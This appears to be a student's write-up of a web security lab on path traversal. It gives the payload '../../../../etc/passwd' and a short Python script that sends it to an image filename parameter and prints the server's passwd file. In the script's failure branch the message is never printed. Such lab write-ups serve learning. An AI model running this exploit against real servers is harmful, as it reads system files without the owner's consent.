This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

---

**Goal:** Exploit the path traversal vulnerability in the display of product images.

**Analysis:** First i locate the vulnerable page which is located when i right click on one of the app images and open it in a new tab. I refresh the page in burpsuite with intercept on, and send the request to repeater. This shows me the vulnerable product image path. Then i can simply use path traversal to exploit the web server. 

![[Pasted image 20240827160526.png]]

**Payload:** 

```php
../../../../etc/passwd
```

**Script:**

```python
#!/usr/bin/python3

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Exploit path traversal attack on the vuln image path
def exploit(url):
	get_file = url + '/image?filename=../../../../etc/passwd'
	r = requests.get(get_file, verify=False, proxies=proxies)
	if 'root' in r.text:
		print('(+) Exploit worked...\n(+) Printing contents now:')
		print(r.text)
	
	else:
		('(-) Exploit failed.')

# User instructions
def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s <URL>' % sys.argv[0])
		print('(+) Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)
		
	url = sys.argv[1]
	exploit(url)	
	
if __name__ == '__main__':
	main() 
```


